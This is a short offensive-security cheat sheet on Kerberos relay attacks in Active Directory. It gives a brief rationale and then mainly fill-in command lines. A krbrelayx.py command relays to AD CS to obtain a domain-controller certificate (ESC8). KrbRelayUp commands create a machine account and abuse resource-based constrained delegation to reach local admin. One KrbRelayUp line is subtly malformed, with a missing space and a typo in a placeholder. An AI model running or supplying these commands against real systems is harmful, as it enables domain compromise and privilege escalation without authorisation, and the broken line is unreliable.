# Kerberos Relay

Kerberos was long assumed unrelayable. It is not: where a client can be made to request a ticket for a service name you control, that ticket can be forwarded to a different service on the same host, including local privilege escalation via KrbRelayUp.

## Why It Works

The service principal name in a ticket binds it to a host account, not to a protocol. Two services running under the same machine account will both accept the same ticket.

## Prerequisites

* A way to trigger Kerberos authentication toward a name you control
* For KrbRelayUp: local code execution on the target as any user

## Execution

**Kerberos relay**

* To HTTP
  * `krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>` [\[tool\]](https://github.com/dirkjanm/krbrelayx)
    * **→ ESC8**
* `SMB -> SMB`
  * same as NTLM relay, use krbrelayx.py
* `SMB -> LDAP(S)`
  * same as NTLM relay, use krbrelayx.py

**Kerberos Relay**

* `KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>` [\[tool\]](https://github.com/Dec0ne/KrbRelayUp)
  * `KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name>-cp <omputer_pass>` [\[tool\]](https://github.com/Dec0ne/KrbRelayUp)
    * **→ Admin**

## Related

* [NTLM Relay](file:///9685693/coercion-relay/ntlm-relay.md) — the better-known equivalent
* [Resource-Based Constrained Delegation](file:///9685693/delegation/resource-based-constrained-delegation.md) — the usual end state
